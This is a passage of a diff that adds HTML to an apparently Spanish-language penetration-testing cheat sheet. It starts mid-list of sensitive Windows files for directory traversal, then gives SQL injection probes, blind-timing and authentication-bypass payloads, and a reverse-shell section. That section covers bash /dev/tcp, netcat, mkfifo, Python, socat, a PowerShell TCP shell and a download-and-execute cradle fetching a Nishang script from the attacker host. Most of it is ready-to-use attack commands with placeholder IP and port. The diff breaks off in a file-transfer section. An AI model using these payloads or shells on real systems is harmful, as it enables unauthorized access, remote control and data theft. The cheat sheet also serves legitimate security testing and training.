+                <span style="color: rgb(20, 115, 120);">c:/sysprep.xml</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/sysprep/sysprep.inf</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/sysprep/sysprep.xml</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/system volume</span> <span
+                    style="color: rgb(180, 109, 68);">information/wpsettings.dat</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/system32/inetsrv/metabase.xml</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/unattend.txt</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/unattend.xml</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/unattended.txt</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/unattended.xml</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/windows/repair/sam</span><br>
+                <span style="color: rgb(20, 115, 120);">c:/windows/repair/system</span><br>
+                <br>
+                <span style="color: rgb(53, 81, 98);"># Always existing files in recent Windows</span><br>
+                <span style="color: rgb(20, 115, 120);">c:\windows\system32\license.rtf</span><br>
+                <span style="color: rgb(20, 115, 120);">c:\windows\system32\eula.txt</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">References</h3>
+            <br>
+            <div class="box">
+                <span>• </span><a
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal"
+                    target="_blank">GitHub
+                    Link</a>
+            </div>
+        </div>
+        <div id="sql-injection" class="content-item">
+            <h2>$ SQL Injection _</h2>
+            <br>
+            <p>La vulnerabilidad de inyección SQL en aplicaciones web ocurre cuando las entradas del usuario no se
+                desinfectan adecuadamente, lo que permite a los atacantes inyectar código SQL malicioso en las
+                consultas. Esto puede provocar acceso no autorizado a la base de datos, robo de datos, manipulación de
+                datos o incluso el compromiso total de la base de datos backend de la aplicación, lo que resulta en
+                importantes violaciones de seguridad y pérdida de datos.
+            </p>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Entry point detection</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Error Messages</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                '<br>
+                %27<br>
+                "<br>
+                %22<br>
+                #<br>
+                %23<br>
+                ;<br>
+                %3B<br>
+                &#41;<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Logical Operations</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(191, 151, 32);">1</span> <span style="color: rgb(180, 109, 68);">or</span> <span
+                    style="color: rgb(191, 151, 32);">1</span><span style="color: rgb(180, 109, 68);">=</span><span
+                    style="color: rgb(191, 151, 32);">1</span>
+                <span style="color: rgb(53, 81, 98);">-- true</span><br>
+                <span style="color: rgb(191, 151, 32);">1</span> <span style="color: rgb(180, 109, 68);">and</span>
+                <span style="color: rgb(191, 151, 32);">1</span><span style="color: rgb(180, 109, 68);">=</span><span
+                    style="color: rgb(191, 151, 32);">2</span>
+                <span style="color: rgb(53, 81, 98);">-- false</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Time/Blind</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(53, 81, 98);">-- MySQL --</span><br>
+                sleep(<span style="color: rgb(191, 151, 32);">10</span>)<br>
+                <br>
+                <span style="color: rgb(53, 81, 98);">-- PostgreSQL --</span><br>
+                pg_sleep(<span style="color: rgb(191, 151, 32);">10</span>)<br>
+                <br>
+                <span style="color: rgb(53, 81, 98);">-- MSSQL --</span><br>
+                WAITFOR DELAY '0:0:10'<br>
+                <br>
+                <span style="color: rgb(53, 81, 98);">-- Oracle --</span><br>
+                [RANDNUM]<span style="color: rgb(180, 109, 68);">=</span><span
+                    style="color: rgb(20, 115, 120);">DBMS_PIPE.</span><span
+                    style="color: rgb(180, 109, 68);">RECEIVE_MESSAGE</span>('[RANDSTR]',[SLEEPTIME])<br>
+                <span style="color: rgb(191, 151, 32);">123</span><span style="color: rgb(180, 109, 68);">=</span><span
+                    style="color: rgb(20, 115, 120);">DBMS_PIPE.</span><span
+                    style="color: rgb(180, 109, 68);">RECEIVE_MESSAGE</span>('ASD',<span
+                    style="color: rgb(191, 151, 32);">10</span>)<br>
+                <br>
+                <span style="color: rgb(53, 81, 98);">-- SQLite --</span><br>
+                [RANDNUM]<span style="color: rgb(180, 109, 68);">=LIKE</span>('ABCDEFG',<span
+                    style="color: rgb(20, 115, 120);">UPPER</span>(HEX(RANDOMBLOB([SLEEPTIME]<span
+                    style="color: rgb(191, 151, 32);">00000000</span><span
+                    style="color: rgb(180, 109, 68);">/</span><span style="color: rgb(191, 151, 32);">2</span>))))<br>
+                <span style="color: rgb(191, 151, 32);">123</span><span
+                    style="color: rgb(180, 109, 68);">=LIKE</span>('ABCDEFG',<span
+                    style="color: rgb(20, 115, 120);">UPPER</span>(HEX(RANDOMBLOB(<span
+                    style="color: rgb(191, 151, 32);">1000000000</span><span
+                    style="color: rgb(180, 109, 68);">/</span><span style="color: rgb(191, 151, 32);">2</span>))))<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">DBMS Identification</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                ["conv('a',16,2)=conv('a',16,2)" ,"MYSQL"],<br>
+                ["connection_id()=connection_id()" ,"MYSQL"],<br>
+                ["crc32('MySQL')=crc32('MySQL')" ,"MYSQL"],<br>
+                ["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)" ,"MSSQL"],<br>
+                ["@@CONNECTIONS>0" ,"MSSQL"],<br>
+                ["@@CONNECTIONS=@@CONNECTIONS" ,"MSSQL"],<br>
+                ["@@CPU_BUSY=@@CPU_BUSY" ,"MSSQL"],<br>
+                ["USER_ID(1)=USER_ID(1)" ,"MSSQL"],<br>
+                ["ROWNUM=ROWNUM" ,"ORACLE"],<br>
+                ["RAWTOHEX('AB')=RAWTOHEX('AB')" ,"ORACLE"],<br>
+                ["LNNVL(0=123)" ,"ORACLE"],<br>
+                ["5::int=5" ,"POSTGRESQL"],<br>
+                ["5::integer=5" ,"POSTGRESQL"],<br>
+                ["pg_client_encoding()=pg_client_encoding()" ,"POSTGRESQL"],<br>
+                ["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],<br>
+                ["quote_literal(42.5)=quote_literal(42.5)" ,"POSTGRESQL"],<br>
+                ["current_database()=current_database()" ,"POSTGRESQL"],<br>
+                ["sqlite_version()=sqlite_version()" ,"SQLITE"],<br>
+                ["last_insert_rowid()>1" ,"SQLITE"],<br>
+                ["last_insert_rowid()=last_insert_rowid()" ,"SQLITE"],<br>
+                ["val(cvar(1))=1" ,"MSACCESS"],<br>
+                ["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0" ,"MSACCESS"],<br>
+                ["cdbl(1)=cdbl(1)" ,"MSACCESS"],<br>
+                ["1337=1337", "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],<br>
+                ["'i'='i'", "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Authentication Bypass</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                '-'<br>
+                ' '<br>
+                '&'<br>
+                '^'<br>
+                '*'<br>
+                ' or 1=1 limit 1 -- -+<br>
+                '="or'<br>
+                ' or ''-'<br>
+                ' or '' '<br>
+                ' or ''&'<br>
+                ' or ''^'<br>
+                ' or ''*'<br>
+                '-||0'<br>
+                "-||0"<br>
+                "-"<br>
+                " "<br>
+                "&"<br>
+                "^"<br>
+                "*"<br>
+                '--'<br>
+                "--"<br>
+                '--' / "--"<br>
+                " or ""-"<br>
+                " or "" "<br>
+                " or ""&"<br>
+                " or ""^"<br>
+                " or ""*"<br>
+                or true--<br>
+                " or true--<br>
+                ' or true--<br>
+                "&#41; or true--<br>
+                '&#41; or true--<br>
+                ' or 'x'='x<br>
+                '&#41; or ('x')=('x<br>
+                ')&#41; or (('x'))=(('x<br>
+                " or "x"="x<br>
+                ") or ("x")=("x<br>
+                ")) or (("x"))=(("x<br>
+                or 2 like 2<br>
+                or 1=1<br>
+                or 1=1--<br>
+                or 1=1#<br>
+                or 1=1/*<br>
+                admin' --<br>
+                admin' -- -<br>
+                admin' #<br>
+                admin'/*<br>
+                admin' or '2' LIKE '1<br>
+                admin' or 2 LIKE 2--<br>
+                admin' or 2 LIKE 2#<br>
+                admin') or 2 LIKE 2#<br>
+                admin') or 2 LIKE 2--<br>
+                admin'&#41; or ('2' LIKE '2<br>
+                admin') or ('2' LIKE '2'#<br>
+                admin') or ('2' LIKE '2'/*<br>
+                admin' or '1'='1<br>
+                admin' or '1'='1'--<br>
+                admin' or '1'='1'#<br>
+                admin' or '1'='1'/*<br>
+                <span style="color: rgb(53, 81, 98);">admin'or 1=1 or ''='</span><br>
+                <span style="color: rgb(53, 81, 98);">admin' or 1=1</span><br>
+                <span style="color: rgb(53, 81, 98);">admin' or 1=1--</span><br>
+                <span style="color: rgb(53, 81, 98);">admin' or 1=1#</span><br>
+                <span style="color: rgb(53, 81, 98);">admin' or 1=1/*</span><br>
+                <span style="color: rgb(53, 81, 98);">admin') or ('1'='1</span><br>
+                <span style="color: rgb(53, 81, 98);">admin') or ('1'='1'--</span><br>
+                <span style="color: rgb(53, 81, 98);">admin') or ('1'='1'#</span><br>
+                <span style="color: rgb(53, 81, 98);">admin') or ('1'='1'/*</span><br>
+                <span style="color: rgb(53, 81, 98);">admin') or '1'='1</span><br>
+                <span style="color: rgb(53, 81, 98);">admin'&#41; or '1'='1'--</span><br>
+                <span style="color: rgb(53, 81, 98);">admin'&#41; or '1'='1'#</span><br>
+                <span style="color: rgb(53, 81, 98);">admin'&#41; or '1'='1'/*</span><br>
+                <span style="color: rgb(53, 81, 98);">1234 ' AND 1=0 UNION ALL SELECT 'admin',
+                    '81dc9bdb52d04dc20036dbd8313ed055</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" --</span><br>
+                <span style="color: rgb(53, 81, 98);">admin';-- azer</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" #</span><br>
+                <span style="color: rgb(53, 81, 98);">admin"/*</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" or "1"="1</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" or "1"="1"--</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" or "1"="1"#</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" or "1"="1"/*</span><br>
+                <span style="color: rgb(53, 81, 98);">admin"or 1=1 or ""="</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" or 1=1</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" or 1=1--</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" or 1=1#</span><br>
+                <span style="color: rgb(53, 81, 98);">admin" or 1=1/*</span><br>
+                <span style="color: rgb(53, 81, 98);">admin"&#41; or ("1"="1</span><br>
+                <span style="color: rgb(53, 81, 98);">admin") or ("1"="1"--</span><br>
+                <span style="color: rgb(53, 81, 98);">admin") or ("1"="1"#</span><br>
+                <span style="color: rgb(53, 81, 98);">admin") or ("1"="1"/*</span><br>
+                <span style="color: rgb(53, 81, 98);">admin") or "1"="1</span><br>
+                <span style="color: rgb(53, 81, 98);">admin"&#41; or "1"="1"--</span><br>
+                <span style="color: rgb(53, 81, 98);">admin"&#41; or "1"="1"#</span><br>
+                <span style="color: rgb(53, 81, 98);">admin"&#41; or "1"="1"/*</span><br>
+                <span style="color: rgb(53, 81, 98);">1234 " AND 1=0 UNION ALL SELECT "admin",
+                    "81dc9bdb52d04dc20036dbd8313ed055</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Cheatsheets</h3>
+            <br>
+            <span>• </span><strong>MySQL</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <a class="link-command"
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md"
+                    target="_blank">GitHub MySQL Injection</a>
+                <br><br>
+                <a class="link-command"
+                    href="https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet"
+                    target="_blank">CheatSheet MySQL Injection</a>
+            </div>
+            <br>
+            <span>• </span><strong>Oracle</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <a class="link-command"
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md"
+                    target="_blank">GitHub MySQL Injection Oracle</a>
+                <br><br>
+                <a class="link-command"
+                    href="https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet"
+                    target="_blank">CheatSheet MySQL Injection Oracle</a>
+            </div>
+            <br>
+            <span>• </span><strong>PostgreSQL</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <a class="link-command"
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md"
+                    target="_blank">GitHub MySQL Injection PostgreSQL</a>
+                <br><br>
+                <a class="link-command"
+                    href="https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet"
+                    target="_blank">CheatSheet MySQL Injection PostgreSQL</a>
+            </div>
+            <br>
+            <span>• </span><strong>MSSQL</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <a class="link-command"
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md"
+                    target="_blank">GitHub MySQL Injection MSSQL</a>
+                <br><br>
+                <a class="link-command"
+                    href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet"
+                    target="_blank">CheatSheet MySQL Injection MSSQL</a>
+            </div>
+            <br>
+            <span>• </span><strong>Other DBMSs</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <a class="link-command"
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#cheatsheets"
+                    target="_blank">GitHub MySQL Injection Other DBMSs</a>
+                <br><br>
+                <a class="link-command" href="https://pentestmonkey.net/category/cheat-sheet/sql-injection"
+                    target="_blank">CheatSheet MySQL Injection Other DBMSs</a>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">References</h3>
+            <br>
+            <div class="box">
+                <span>• </span><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+                    target="_blank">GitHub
+                    Link</a>
+                <br><br>
+                <span>• </span><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection"
+                    target="_blank">HackTricks
+                    Link</a>
+                <br><br>
+                <span>• </span><a href="https://pentestmonkey.net/category/cheat-sheet/sql-injection"
+                    target="_blank">Cheat_Sheet
+                    Link</a>
+            </div>
+        </div>
+        <div id="ssrf" class="content-item">
+            <h2>$ SSRF (Server Side Request Forgery) _</h2>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">
+                COMING SOON
+            </h3>
+        </div>
+        <div id="ssti" class="content-item">
+            <h2>$ SSTI (Server Side Template Injection) _</h2>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">
+                COMING SOON
+            </h3>
+        </div>
+        <div id="xss" class="content-item">
+            <h2>$ XSS (Cross-site scripting) _</h2>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">
+                COMING SOON
+            </h3>
+        </div>
+        <div id="xxe" class="content-item">
+            <h2>$ XXE (XML External Entity) _</h2>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">
+                COMING SOON
+            </h3>
+        </div>
+        <div id="active-directory" class="content-item">
+            <h2>$ Active Directory _</h2>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">
+                COMING SOON
+            </h3>
+        </div>
+        <div id="reverse-shell" class="content-item">
+            <h2>$ Reverse Shell _</h2>
+            <br>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Reverse Shells</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Reverse Shell Generator</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <a class="link-command" href="https://www.revshells.com" target="_blank">Reverse Shell Generator
+                    Link</a>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Bash</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">bash</span>
+                <span style="color: rgb(180, 109, 68);">-i</span> <span style="color: rgb(167, 82, 33)">&gt;&</span>
+                <span style="color: rgb(180, 109, 68);">/dev/tcp/<span
+                        style="color: rgb(167, 82, 33)">&lt;</span>IP<span
+                        style="color: rgb(167, 82, 33)">&gt;</span>/<span
+                        style="color: rgb(167, 82, 33)">&lt;</span>PORT<span
+                        style="color: rgb(167, 82, 33)">&gt;</span></span> <span
+                    style="color: rgb(167, 82, 33)">0&gt;&1</span>
+            </div>
+            <br>
+            <div class="command_into" style="font-weight: bold;">
+                <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                <span style="color: rgb(225, 225, 225);">Se recomienda encapsular el
+                    comando en un</span> <span class="nmap-box-into"
+                    style="color: rgb(225, 225, 225); display: block;">bash -c ''</span> <span>para evitar problemas con
+                    la
+                    funcionalidad bash /dev/tcp.</span>
+            </div>
+            <br>
+            <p>Podemos codificar el contenido en base64, para evitar conflictos con símbolos y espacios en las URL.
+                Además, para evitar que aparezcan caracteres "+", podemos utilizar codificación doble.</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(53, 81, 98);"># Get the encoded command</span>
+                <br>
+                <span style="color: rgb(20, 115, 120);">echo <span style="color: white">"</span><span
+                        style="color: white">bash -i >&
+                        /dev/tcp/&lt;ip&gt;/&lt;port&gt;
+                        0>&1</span><span style="color: white">"</span> <span style="color: rgb(167, 82, 33)">|</span>
+                    <span style="color: rgb(20, 115, 120);">base64</span>
+                    <span style="color: rgb(167, 82, 33)">|</span> <span
+                        style="color: rgb(20, 115, 120);">base64</span></span>
+                <br><br>
+                <span style="color: rgb(53, 81, 98);"># Execute the reverse shell</span>
+                <br>
+                <span style="color: rgb(20, 115, 120);">echo <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">b64_code</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span> <span style="color: rgb(167, 82, 33)">|</span>
+                    <span style="color: rgb(20, 115, 120);">base64</span> <span
+                        style="color: rgb(180, 109, 68);">-d</span> <span style="color: rgb(167, 82, 33)">|</span>
+                </span>
+                <span style="color: rgb(20, 115, 120);">base64</span> <span style="color: rgb(180, 109, 68);">-d</span>
+                <span style="color: rgb(167, 82, 33)">|</span>
+                <span style="color: rgb(20, 115, 120);">bash</span></span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Netcat</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">nc <span style="color: rgb(180, 109, 68);">-e</span> <span
+                        style="color: rgb(180, 109, 68);">/bin/bash</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">IP</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">PORT</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Mkfifo</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">rm <span style="color: rgb(180, 109, 68);">/tmp/f;</span><span
+                        style="color: rgb(20, 115, 120);">mkfifo</span> <span
+                        style="color: rgb(180, 109, 68);">/tmp/f;</span><span
+                        style="color: rgb(20, 115, 120);">cat</span> <span
+                        style="color: rgb(180, 109, 68);">/tmp/f|</span><span
+                        style="color: rgb(20, 115, 120);">/bin/sh</span> <span
+                        style="color: rgb(180, 109, 68);">-i</span> <span
+                        style="color: rgb(167, 82, 33)">2>&1|</span><span style="color: rgb(20, 115, 120);">nc</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">IP</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">PORT</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">></span><span style="color: rgb(180, 109, 68);">/tmp/f</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Python3</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                i="&lt;ip&gt;" p=&lt;port&gt; && echo "import
+                socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$i',$p));os.dup2(s.fileno(),0);
+                os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('bash')" | python3
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Socat</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">socat <span
+                        style="color: rgb(180, 109, 68);">tcp-connect:</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">IP</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span><span style="color: rgb(180, 109, 68);">:</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">PORT</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">exec:/bin/bash,pty,stderr,setsid,sigint,sane</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">PowerShell</h3>
+            <br>
+            <strong>Base64</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(53, 81, 98);"># Get the encoded command</span>
+                <br>
+                <span style="color: white">echo '$client = New-Object System.Net.Sockets.TCPClient("<ip>",
+                        <port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
+                            $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
+                            System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String
+                            );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =
+                            ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+                            | base64 -w 0; echo
+                            <br><br>
+                            <span style="color: rgb(53, 81, 98);"># Execute the reverse shell</span>
+                            <br>
+                            <span style="color: rgb(20, 115, 120);">powershell <span
+                                    style="color: rgb(180, 109, 68);">-e</span> <span
+                                    style="color: rgb(167, 82, 33)">&lt;</span><span
+                                    style="color: rgb(180, 109, 68);">b64_code</span><span
+                                    style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <strong>Nishang</strong>
+            <br><br>
+            <p>Ejecute esto en su máquina local:</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                i="&lt;ip&gt;" p=&lt;port&gt; && curl -sL
+                https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -o
+                rs.ps1 && echo "Invoke-PowerShellTcp -Reverse -IPAddress $i -Port $p" >> rs.ps1 && python3 -m
+                http.server 80
+            </div>
+            <br>
+            <p>Y mientras ejecuta el servidor http de Python, ejecute esto en el destino:</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                powershell "IEX(New-Object Net.WebClient).downloadString('http://&lt;ip&gt;/rs.ps1')"
+            </div>
+            <br>
+            <strong>Netcat</strong>
+            <br><br>
+            <p>Localice "nc.exe" y cópielo en su directorio actual, luego ejecútelo en su máquina local:</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">smbserver.py <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">share_name</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: white">$(<span style="color: rgb(20, 115, 120);">pwd</span>)</span> <span
+                        style="color: rgb(180, 109, 68);">-smb2support</span>
+            </div>
+            <br>
+            <p>Y mientras ejecuta el servidor smb, ejecute esto en el destino:</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                \\&lt;ip&gt;\smbShare\nc.exe -e cmd &lt;ip&gt; &lt;port&gt;
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Interactive TTY</h3>
+            <br>
+            <div class="command_into" style="font-weight: bold;">
+                <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                <span style="color: rgb(225, 225, 225);">También es posible
+                    utilizar</span> <span class="nmap-box-into" style="color: rgb(225, 225, 225);">rlwrap</span>
+                <span style="color: rgb(225, 225, 225);">al iniciar su toma de escucha:</span>
+                <br>
+                <div class="command_into_command2" style="font-weight: bold;">
+                    <span style="color: rgb(20, 115, 120);">rlwrap <span style="color: rgb(180, 109, 68);">-cAr nc
+                            -nlvp</span> <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                            style="color: rgb(180, 109, 68);">IP</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                </div>
+            </div>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">script <span style="color: rgb(180, 109, 68);">/dev/null -c
+                        bash</span>
+            </div>
+            <br>
+            <p>or</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">python <span style="color: rgb(180, 109, 68);">-c</span>
+                    <span style="color: white;">'import pty; pty.spawn("/bin/bash")'</span>
+            </div>
+            <br>
+            <p>and then</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(53, 81, 98);"># &lt;Ctrl&gt; +
+                    &lt;z&gt;</span><br>
+                <span style="color: rgb(20, 115, 120);">stty</span> <span style="color: rgb(180, 109, 68);">raw
+                    -echo</span>; <span style="color: rgb(20, 115, 120);">fg</span><br>
+                <span style="color: rgb(20, 115, 120);">reset</span> <span
+                    style="color: rgb(180, 109, 68);">xterm</span><br>
+                <span style="color: rgb(167, 82, 33)">export</span> TERM<span
+                    style="color: rgb(167, 82, 33)">=</span><span style="color: rgb(20, 115, 120);">xterm</span><br>
+                <span style="color: rgb(167, 82, 33)">export</span> SHELL<span
+                    style="color: rgb(167, 82, 33)">=</span><span style="color: rgb(20, 115, 120);">bash</span><br>
+                <span style="color: rgb(20, 115, 120);">stty</span> <span style="color: rgb(180, 109, 68);">rows</span>
+                <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                    style="color: rgb(180, 109, 68);">rows</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                <span style="color: rgb(180, 109, 68);">columns</span> <span
+                    style="color: rgb(167, 82, 33)">&lt;</span><span style="color: rgb(180, 109, 68);">cols</span><span
+                    style="color: rgb(167, 82, 33)">&gt;</span>
+                <span style="color: rgb(53, 81, 98);">#
+                    Check size in
+                    another window -> stty size</span><br>
+            </div>
+        </div>
+        <div id="file-transfer" class="content-item">
+            <h2>$ File Transfer _</h2>
+            <br>
+            <div class="command_into" style="font-weight: bold;">
+                <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                <span style="color: rgb(225, 225, 225);">Siempre puedes verificar la integridad de los archivos
+                    calculando el hash md5 del archivo para asegurarte de que se haya transferido correctamente:</span>
+                <br>
+                <div class="command_into_command2" style="font-weight: bold;">
+                    # Linux<br>
+                    md5sum &lt;file&gt;<br>
+                    <br>
+                    # Windows<br>
+                    certutil -hashfile &lt;file&gt; md5<br>
+                </div>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">HTTP/PHP</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Python3</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">python3 <span style="color: rgb(180, 109, 68);">-m
+                        http.server</span> <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">port</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Python2</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">python3 <span style="color: rgb(180, 109, 68);">-m
+                        SimpleHTTPServer</span> <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">port</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">PHP</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">php <span style="color: rgb(180, 109, 68);">-S
+                        0.0.0.0:</span><span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">port</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Download</h3>
+            <br>
+            <strong>Wget</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">wget <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">url</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <strong>Curl</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
